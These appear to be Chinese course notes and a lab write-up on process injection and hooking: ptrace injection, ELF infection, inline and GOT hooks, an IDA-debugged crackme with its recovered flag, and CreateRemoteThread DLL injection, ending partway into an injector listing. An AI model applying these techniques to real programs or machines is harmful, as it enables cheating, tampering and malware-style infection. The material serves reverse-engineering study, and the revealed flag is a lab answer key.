title="进程注入"></a>进程注入</h4><p>处于对进程安全性的保护，操作系统会将进程之间的空间进行隔离，防止跨进程访问其他进程空间的信息。游戏黑客们需要通过注入，将特定模块注入游戏进程中，访问和篡改游戏进程的信息，包括数据、代码等，从而实现外挂功能，所以进程注入式实现外挂功能的基础。进程注入可以分为动态注入和静态注入。</p><h4 id="ptrace注入流程"><a href="#ptrace注入流程" class="headerlink" title="ptrace注入流程"></a>ptrace注入流程</h4><p>ptrace注入技术的核心是对ptrace函数的使用，ptrace函数为一个进程提供了近视和控制其他进程的方法，注入进程后，父进程可以读取和修改子进程的内存空间数据及寄存器值。</p><blockquote><p>函数定义</p></blockquote><p><code>ptrace()</code>系统调用的函数签名如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>对函数签名中的四个参数做如下说明：</p><ul><li>request：要执行的操作类型；&#x2F;&#x2F;反调试会用到<code>PT_DENY_ATTACH</code>，调试会用到<code>PTRACE_ATTACH</code></li><li>pid：被追踪的目标进程ID；</li><li>addr：被监控的目标内存地址；</li><li>data：保存读取出或者要写入的数据。</li></ul><blockquote><p>相关request(部分)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_ATTACH: 表示附加到指定远程进程</span><br><span class="line">PTRACE_GETREGS: 表示读取远程进程当前的寄存器环境</span><br><span class="line">PTRACE_SETREGS: 表示设置远程进程的寄存器环境</span><br><span class="line">PTRACE_PEEKTEXT: 从远程进程指定内存地址写入一个word大小的数据</span><br><span class="line">PTRACE_POKETTEXT: 往远程进程指定内存地址写入一个word大小的数据</span><br></pre></td></tr></table></figure><blockquote><p> 进程状态</p></blockquote><p>在Linux系统中，进程常见的状态有下面一些：</p><ul><li>S：Interruptible Sleeping，即可中断睡眠；</li><li>D：Uninterruptible Sleeping，即不可中断睡眠；</li><li>R：Running or Runnable，即运行状态；</li><li>Z：Zombie，即僵尸状态；</li><li>T：Stopped or Traced，即中止状态（注意是“中止”而非“终止”）。</li></ul><p>这里，我们关注点放在<code>T：Stopped or Traced</code>这个类型上。因为<code>Traced</code>类型是由<code>ptrace</code>系统调用提供的一个进程状态。实际上，在某些Linux发行版中，这个类型的进程状态标识符是<code>t</code>而非<code>T</code>。</p><p><code>通过ptrace系统调用可以让一个进程进入Traced状态</code></p><h4 id="ptrace实现流程"><a href="#ptrace实现流程" class="headerlink" title="ptrace实现流程"></a>ptrace实现流程</h4><blockquote><p>流程</p></blockquote><ul><li>attach到远程进程</li><li>保存寄存器环境</li><li>远程调用mmap函数分配内存空间</li><li>向远程进程内存空间写入加载模块名和调用函数</li><li>远程调用dlopen函数打开注入模块</li><li>远程调用dlsym函数获取需要调用函数地址</li><li>远程调用被注入模块的函数</li><li>恢复寄存器环境</li><li>从远程进程detach</li></ul><blockquote><p>附加到远程进程上</p></blockquote><p>第一步是附加到远程进程上，调用方式如下：</p><p><code>ptrace(PTRACE_ATTACH,pid,NULL,NULL);</code></p><p>在附加到远程进程中，远程进程的执行会被中断，此时父进程可以通过调用<code>waitpid</code>函数来判断子进程是否进入暂停状态；</p><p><code>waitpid(pid,status,options);</code></p><blockquote><p>保存寄存器环境</p></blockquote><p>通过ptrace改变远程进程的执行流程之前，需要先读取和保护远程进程的所有寄存器的值，当detach操作发生时，用于恢复远程进程原有的执行环境。</p><p>读取和写入寄存器，调用ptrace函数的request函数分别为PTRACE_GETREGS和PTRACE_SETREGS。对应调用的代码如下：</p><p><code>ptrace(PTRACE_GETREGS,pid,NULL,regs);</code></p><p><code>ptrace(PTRACE_SETREGS,pid,NULL,regs);</code></p><blockquote><p>远程进程的内存读取和写入数据</p></blockquote><p>读取和写入内存数据，调用ptrace函数的request参数分别为PTRACE_PEEKTEXT和PTRACE_POKETEXT。对应调用的代码如下</p><p><code>ptrace(PTRACE_PEEKTEXT,pid,addr,pBuf);</code></p><p><code>ptrace(PTRACE_POKETEXT,pid,addr,data);</code></p><p>读取和写入内存，都是以word为单位进行的。写入数据时需要特别注意，若写入的数据长度不是word大小的倍数，则在写入最后一个不足word大小的数据时，要先保存原地址处的高位数据。</p><blockquote><p>远程调用函数</p></blockquote><p>首先判断函数调用的参数个数，前4个按顺序分别写入R0-R3寄存器中，后面从右至左压入栈中。</p><p>然后修改进程的PC寄存器为需要执行的函数地址，若为Thumb指令，则需要将最低位重新设置为0，并且将CPSR寄存器的T标志位置位；若为ARM指令，则将CPSR寄存器的T标志位复位。</p><p>最后设置远程进程的LR寄存器的值为0，远程进程的函数调用结束后，程序会跳转到LR寄存器存储的地址，但由于LR寄存器被设置为0，所以会导致远程进程执行出错，此时进程会进入暂停状态，被Tracer进程接管，通过读取远程进程的R0寄存器可以获取远程函数调用的返回结果。</p><blockquote><p>恢复寄存器值</p></blockquote><blockquote><p>Detach进程</p></blockquote><p><code>ptrace(PTRACE_DETACH,pid,NULL,0);</code></p><h4 id="ELF文件静态注入"><a href="#ELF文件静态注入" class="headerlink" title="ELF文件静态注入"></a>ELF文件静态注入</h4><p>Android平台下Native层的可执行文件属于ELF文件格式，通过感染ELF文件可以实现Android平台的注入功能。可执行文件感染是通过修改可执行文件，并添加自己的代码，是的可执行文件在运行时先执行添加的代码，在执行原逻辑。</p><h4 id="ELF文件格式"><a href="#ELF文件格式" class="headerlink" title="ELF文件格式"></a>ELF文件格式</h4><ul><li>ELF Header</li></ul><p>它是ELF文件中唯一一个固定位置的文件结构，在其中保存了Program Header Table和Section Header Table的位置和大小信息。</p><ul><li>Program Header Table</li></ul><p>它保存了ELF文件的加载过程中各Section的内存映射、依赖库等信息，是实现ELF感染最重要的结构之一。</p><h4 id="感染ELF文件的注入实现过程"><a href="#感染ELF文件的注入实现过程" class="headerlink" title="感染ELF文件的注入实现过程"></a>感染ELF文件的注入实现过程</h4><ul><li>在DT_STRTAB指向的字符串表中添加自定义的so模块名。由于直接在原字符表中添加一项数据，会导致字符串表后面的所有数据的文件偏移发生变化，所以通常会将字符串表移至文件末尾。</li><li>由于字符表会被映射到内存中，所以需要在Program Header Table中添加PT_Load表项，新添加的PT_Load表项可将文件尾添加的字符串表数据映射到内存中，同时需要将Program Header Table移动到文件尾。</li><li>修改DT_STRTAB、DT_STRSZ，使其指向新字符串表，然后在dynamic array的结尾加上DT_NEEDED表项，并指向自定义的so模块名</li><li>修改ELF Header 结构中Program Header Table的位置信息，并指向新的Program Header Table</li></ul><h3 id="Hook技术的实现原理"><a href="#Hook技术的实现原理" class="headerlink" title="Hook技术的实现原理"></a>Hook技术的实现原理</h3><h4 id="替换汇编编码–Inline-Hook的实现"><a href="#替换汇编编码–Inline-Hook的实现" class="headerlink" title="替换汇编编码–Inline Hook的实现"></a>替换汇编编码–Inline Hook的实现</h4><p>Inline Hook是基于二进制汇编代码替换方式而实现的Hook。Inline Hook属于底层的HooK方式，与系统平台可执行文件的汇编指令集息息相关，所以实现Inline Hook的难度较大。Inline Hook的优势非常明显：功能强大，执行效率高</p><h5 id="Inline-Hook的实现原理"><a href="#Inline-Hook的实现原理" class="headerlink" title="Inline Hook的实现原理"></a>Inline Hook的实现原理</h5><p>Inline Hook直接修改需要Hook位置的指令代码，并让其跳转到桩函数中。在桩函数中调用自定义的桩函数。处理完自定义的桩函数后再跳转执行原指令。</p><h4 id="替换汇编编码–导入表-Hook的实现"><a href="#替换汇编编码–导入表-Hook的实现" class="headerlink" title="替换汇编编码–导入表 Hook的实现"></a>替换汇编编码–导入表 Hook的实现</h4><p>在Android平台下导入表Hook属于API Hook的函数地址替换类型。相对于Inline Hook的实现方式，导入表Hook的实现较为简单，原理为：替换需要Hook的导入函数地址，当导入函数调用时Hook函数先获得执行时机。</p><h5 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h5><p>导入表Hook通常以so文件的导入函数作为目标，进行函数指针替换。首先打开so问阿金，并解析elf格式，定位到so文件静态的.got表位置，并在内存中找到响应的.got表位置，此时内存中.got表中保存着导入的函数地址，找到目标函数后替换为新的函数地址，于是便实现了导入表的Hook操作。</p><h2 id="第一次作业"><a href="#第一次作业" class="headerlink" title="第一次作业"></a>第一次作业</h2><h3 id="1-分析并调试程序，找到flag"><a href="#1-分析并调试程序，找到flag" class="headerlink" title="1.分析并调试程序，找到flag"></a>1.分析并调试程序，找到flag</h3><p>使用技术：IDA动态调试crackme.exe</p><h4 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h4><blockquote><p> 步骤</p></blockquote><p>1.找到文件夹IDA目录下的dbgsrv文件夹，找到对应版本的win_32或者64remote.exe，点击运行。</p><p>2.打开ida，将exe拖入，Debugger → Select a debugger → Remote windows debugger</p><p>3.Debugger → process options → 填写三行(第一，二行为 文件的路径，第三行为空，也可设置为文件对应的根目录) 和 Hostname设为127.0.0.1（代表本机） → ok</p><p>4.附加程序：先运行我们要调试的软件，然后Debugger → Attach to process… → 选中我们要调试的程序 → attach</p><blockquote><p> 快捷键</p></blockquote><p>1.F2下断点<br>2.F7，f8单步步入<br>3.N重名<br>4.g跳到地址和函数名<br>5.u取消把函数汇编变成机器码<br>6.c就是把机器码变成汇编<br>7.F5<br>8.p分析函数，把机器码那些东西翻译成函数<br>9.ctrl+s看见系统所有的模块<br>10.ctrl+f搜索<br>11.单步调试注意右上角，寄存器变蓝色表示被改了<br>12.otions-&gt;number of opcode bytes可以查看机器码，填入4一行看4个机器码<br>13.在hex view-1按F2可以修改机器码，再次按F2确定修改<br>14.alt+g看是thumb还是arm指令<br>15.在函数名上按X可以看见上层调用<br>16.在f5伪c&#x2F;c++代码的情况下，注释是&#x2F;，汇编情况下注释是;<br>17.f4移动到光标处<br>18.在寄存器窗口按E可以修改寄存器的值<br>19.在内存窗口f2可以修改内存的值</p><p>ctrl+F7：运行至函数结束，用来跳出函数</p><p>ctrl+F2：重新开始调试</p><h4 id="关于本题"><a href="#关于本题" class="headerlink" title="关于本题"></a>关于本题</h4><ul><li>进入IDA动态debug，打断点到<code>sub_7FF755DA14D0()</code>发现这个函数进行了printf(‘请输入flag:’)操作</li><li>猜测下一个函数就进行flag输入的验证，即<code>sub_7FF755DA1020(&amp;v34);</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF755DA1020(&amp;v34);</span><br><span class="line">  CreateThread(<span class="number">0</span>i64, <span class="number">0</span>i64, StartAddress, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">  sub_7FF755DA1070(&amp;unk_7FF755DC5600, v37);</span><br><span class="line">  v35[<span class="number">0</span>] = xmmword_7FF755DC5618;</span><br><span class="line">  v36 = <span class="number">85</span>;</span><br><span class="line">  v35[<span class="number">1</span>] = xmmword_7FF755DC5628;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  v15 = (<span class="type">char</span> *)v35 + <span class="number">4</span>;</span><br><span class="line">  v16 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC5670);</span><br><span class="line">  v17 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC56C0);</span><br><span class="line">  v18 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC5690);</span><br><span class="line">  v34 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC56B0);</span><br><span class="line">  v19 = v34.m128i_i32[<span class="number">0</span>];</span><br><span class="line">  v20 = _mm_cvtsi32_si128(<span class="number">5u</span>);</span><br><span class="line">  v21 = _mm_cvtsi32_si128(<span class="number">0x1F</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15 += <span class="number">8</span>;</span><br><span class="line">    v22 = _mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v0), <span class="number">0</span>), v16);</span><br><span class="line">    v23 = _mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v0 + <span class="number">4</span>), <span class="number">0</span>), v16);</span><br><span class="line">    v0 += <span class="number">8</span>;</span><br><span class="line">    v24 = _mm_sra_epi32(</span><br><span class="line">            _mm_add_epi32(</span><br><span class="line">              (__m128i)_mm_shuffle_ps(</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpacklo_epi32(v22, v22), v17),</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpackhi_epi32(v22, v22), v17),</span><br><span class="line">                         <span class="number">221</span>),</span><br><span class="line">              v22),</span><br><span class="line">            v20);</span><br><span class="line">    v25 = _mm_and_si128(</span><br><span class="line">            _mm_shuffle_epi32(</span><br><span class="line">              _mm_shufflehi_epi16(</span><br><span class="line">                _mm_shufflelo_epi16(</span><br><span class="line">                  _mm_sub_epi32(v22, _mm_mullo_epi32(_mm_add_epi32(_mm_srl_epi32(v24, v21), v24), v18)),</span><br><span class="line">                  <span class="number">216</span>),</span><br><span class="line">                <span class="number">216</span>),</span><br><span class="line">              <span class="number">216</span>),</span><br><span class="line">            (__m128i)xmmword_7FF755DC56A0);</span><br><span class="line">    *((_DWORD *)v15 - <span class="number">3</span>) = _mm_cvtsi128_si32(</span><br><span class="line">                             _mm_xor_si128(</span><br><span class="line">                               _mm_add_epi8(_mm_packus_epi16(v25, v25), _mm_cvtsi32_si128(v19)),</span><br><span class="line">                               _mm_cvtsi32_si128(*((_DWORD *)v15 - <span class="number">3</span>))));</span><br><span class="line">    v26 = _mm_sra_epi32(</span><br><span class="line">            _mm_add_epi32(</span><br><span class="line">              (__m128i)_mm_shuffle_ps(</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpacklo_epi32(v23, v23), v17),</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpackhi_epi32(v23, v23), v17),</span><br><span class="line">                         <span class="number">221</span>),</span><br><span class="line">              v23),</span><br><span class="line">            v20);</span><br><span class="line">    v27 = _mm_and_si128(</span><br><span class="line">            _mm_shuffle_epi32(</span><br><span class="line">              _mm_shufflehi_epi16(</span><br><span class="line">                _mm_shufflelo_epi16(</span><br><span class="line">                  _mm_sub_epi32(v23, _mm_mullo_epi32(_mm_add_epi32(_mm_srl_epi32(v26, v21), v26), v18)),</span><br><span class="line">                  <span class="number">216</span>),</span><br><span class="line">                <span class="number">216</span>),</span><br><span class="line">              <span class="number">216</span>),</span><br><span class="line">            (__m128i)xmmword_7FF755DC56A0);</span><br><span class="line">    *((_DWORD *)v15 - <span class="number">2</span>) = _mm_cvtsi128_si32(</span><br><span class="line">                             _mm_xor_si128(</span><br><span class="line">                               _mm_add_epi8(_mm_packus_epi16(v27, v27), _mm_cvtsi32_si128(v19)),</span><br><span class="line">                               _mm_cvtsi32_si128(*((_DWORD *)v15 - <span class="number">2</span>))));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v0 &lt; <span class="number">32</span> );</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt; <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">    v28 = (<span class="type">char</span> *)v35 + v0;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v28;</span><br><span class="line">      v29 = v0 / <span class="number">57</span>;</span><br><span class="line">      v30 = v0++;</span><br><span class="line">      *(v28 - <span class="number">1</span>) ^= v30 - <span class="number">57</span> * v29 + <span class="number">53</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v0 &lt; <span class="number">33</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  v31 = v37;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v32 = (<span class="type">unsigned</span> __int8)*(v31 - <span class="number">48</span>);</span><br><span class="line">    v33 = (<span class="type">unsigned</span> __int8)*v31 - v32;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v32 );</span><br><span class="line">  <span class="keyword">if</span> ( v33 )</span><br><span class="line">    v34.m128i_i32[<span class="number">0</span>] = <span class="number">-872817740</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v34.m128i_i32[<span class="number">0</span>] = <span class="number">-1879061547</span>;</span><br><span class="line">  v34.m128i_i16[<span class="number">2</span>] = <span class="number">3338</span>;</span><br><span class="line">  *(__int16 *)((<span class="type">char</span> *)v34.m128i_i16 + <span class="number">1</span>) ^= <span class="number">0x3736</span>u;</span><br><span class="line">  v34.m128i_i8[<span class="number">3</span>] ^= <span class="number">0x38</span>u;</span><br><span class="line">  v34.m128i_i8[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_7FF755DA1020(&amp;v34);</span><br><span class="line">  Sleep(<span class="number">0x1388</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>创建了一个子进程</li><li>sub_7FF755DA1070(&amp;unk_7FF755DC5600, v37);第一个参数为%s，猜测为scanf函数，v37就是我们传入的flag，存储在[rcx-8]中</li></ul><p>打断点在scanf然后进一步调试，观察栈中数据变化，发现[rbp+57h+var_B0]中存储的是flag的信息，</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215213439983.png" alt="image-20231215213439983" style="zoom:50%;" /><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215214312875.png" alt="image-20231215214312875"></p><p>字符串为：HiGWDUuXQS6wVHBTp0ERfJe6VqprMqD1</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215214839633.png" alt="image-20231215214839633" style="zoom:50%;" /><h3 id="2-远程注入模块"><a href="#2-远程注入模块" class="headerlink" title="2.远程注入模块"></a>2.远程注入模块</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ul><li>使用Windows API CreateRemoteThread 远程注入模块到crackme进程中并且不崩溃</li><li>然后使用ark工具(例如processhacker等)能够查看注入模块的信息。</li><li>通过Hook进程中的函数使得输入任何字符串，控制台都会打印”正确”。</li></ul><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><blockquote><p> Dll注入原理</p></blockquote><p>Dll注入一般指向一个正在运行的程序注入一个线程,注入的线程运行我们的代码,而我们的代码就以DLL(动态链接库)的形式存在。但是程序不会平白无故的就加载我们的dll,这时候就需要使用我们强大的Windows API了,它为我们提供了大量的函数来附加和操纵其他进程。<br> API中的所有函数都包含于DLL文件之中。其中，最重要的是“Kernel32.dll”（包含管理内存，进程和线程相关的函数），“User32.dll”（大部分是用户接口函数），和“GDI32.dll”（绘制图形和显示文本相关的函数）。。</p><p>其中最经典的注入方式：<strong>远程进程注入</strong></p><p>这种方法灵活性高,同时要求掌握的知识也很多，其核心思想就是<strong>在目标进程中开启一个线程调用LoadLibrary函数来加载我们想要注入的dll.</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20231215181957773.png" alt="image-20231215181957773" style="zoom: 50%;" /><blockquote><p>具体流程</p></blockquote><ul><li>获得要注入进程的进程ID，可以使用进程名获得。</li><li>使用VirtualAllocEx api来在该进程内开辟一块内存，大小正好是DLL路径。</li><li>将DLL路径信息通过WriteProcessMemory 写入该进程空间。</li><li>获得kernal32在本进程的地址。因为同平台下所有exe都在同一位置加载kernal32。</li><li>在kernal32中获得LoadLibraryW的地址，此地址也是被注入进程的LoadLibraryW地址。</li><li>创建远程线程执行这个LoadLibraryW操作，参数就是要传入的DLL路径。</li></ul><blockquote><p>dll文件结构</p></blockquote><p><strong>DllMain</strong></p><p> 跟exe有个main或者WinMain入口函数一样，DLL也有一个入口函数，就是DllMain。以“DllMain”为关键字。对于动态链接库，DllMain是一个可选的入口函数。</p><p>函数定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DllMain(</span><br><span class="line">  _In_ HINSTANCE hinstDLL, // 指向自身的句柄</span><br><span class="line">  _In_ DWORD fdwReason, // 调用原因</span><br><span class="line">  _In_ LPVOID lpvReserved // 隐式加载和显式加载</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>对于第二个参数fdwReason：它指明了系统调用Dll的原因，可能是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DLL_PROCESS_ATTACH</span><br><span class="line">DLL_PROCESS_DETACH</span><br><span class="line">DLL_THREAD_ATTACH</span><br><span class="line">DLL_THREAD_DETACH</span><br></pre></td></tr></table></figure><p>下面详细分析：</p><ul><li>进程映射</li></ul><p>DLL_PROCESS_ATTACH</p><p>一个程序要调用Dll里的函数，首先要先把DLL文件映射到进程的地址空间。要把一个DLL文件映射到进程的地址空间，有两种方法：LoadLibrary或者LoadLibraryEx。</p><p>当一个DLL文件被映射到进程的地址空间时，系统调用该DLL的DllMain函数，传递的fdwReason参数为DLL_PROCESS_ATTACH，这种调用只会发生在第一次映射时。如果同一个进程后来为已经映射进来的DLL再次调用LoadLibrary或者LoadLibraryEx，操作系统只会增加DLL的使用次数，它不会再用DLL_PROCESS_ATTACH调用DLL的DllMain函数。不同进程用LoadLibrary同一个DLL时，每个进程的第一次映射都会用DLL_PROCESS_ATTACH调用DLL的DllMain函数。</p><ul><li>进程卸载</li></ul><p>DLL_PROCESS_DETACH</p><p>当DLL被从进程的地址空间解除映射时，系统调用了它的DllMain，传递的fdwReason值是DLL_PROCESS_DETACH。当DLL处理该值时，它应该执行进程相关的清理工作。</p><p>那么什么时候DLL被从进程的地址空间解除映射呢？两种情况：</p><p>​1.FreeLibrary解除DLL映射（有几个LoadLibrary，就要有几个FreeLibrary）</p><p>​2.进程结束而解除DLL映射，在进程结束前还没有解除DLL的映射，进程结束后会解除DLL映射。（如果进程的终结是因为调用了TerminateProcess，系统就不会用DLL_PROCESS_DETACH来调用DLL的DllMain函数。这就意味着DLL在进程结束前没有机会执行任何清理工作。）</p><p>注意：当用DLL_PROCESS_ATTACH调用DLL的DllMain函数时，如果返回FALSE，说明没有初始化成功，系统仍会用DLL_PROCESS_DETACH调用DLL的DllMain函数。因此，必须确保清理那些没有成功初始化的东西。</p><ul><li>线程映射</li></ul><p>DLL_THREAD_ATTACH</p><p>当进程创建一线程时，系统查看当前映射到进程地址空间中的所有DLL文件映像，并用值DLL_THREAD_ATTACH调用DLL的DllMain函数。</p><p>新创建的线程负责执行这次的DLL的DllMain函数，只有当所有的DLL都处理完这一通知后，系统才允许进程开始执行它的线程函数。</p><p>注意跟DLL_PROCESS_ATTACH的区别，第n(n&gt;&#x3D;2)次以后地把DLL映像文件映射到进程的地址空间时，是不再用DLL_PROCESS_ATTACH调用DllMain的。而DLL_THREAD_ATTACH不同，进程中的每次建立线程，都会用值DLL_THREAD_ATTACH调用DllMain函数，哪怕是线程中建立线程也一样。</p><ul><li>线程卸载</li></ul><p>DLL_THREAD_DETACH</p><p>如果线程调用了ExitThread来结束线程（线程函数返回时，系统也会自动调用ExitThread），系统查看当前映射到进程空间中的所有DLL文件映像，并用DLL_THREAD_DETACH来调用DllMain函数，通知所有的DLL去执行线程级的清理工作。</p><p>注意：如果线程的结束是因为系统中的一个线程调用了<code>TerminateThread</code>，系统就不会用值DLL_THREAD_DETACH来调用所有DLL的DllMain函数。</p><h4 id="关于本题-1"><a href="#关于本题-1" class="headerlink" title="关于本题"></a>关于本题</h4><h5 id="注入文件：evil-cpp-生成evil-exe"><a href="#注入文件：evil-cpp-生成evil-exe" class="headerlink" title="注入文件：evil.cpp(生成evil.exe)"></a>注入文件：evil.cpp(生成evil.exe)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span 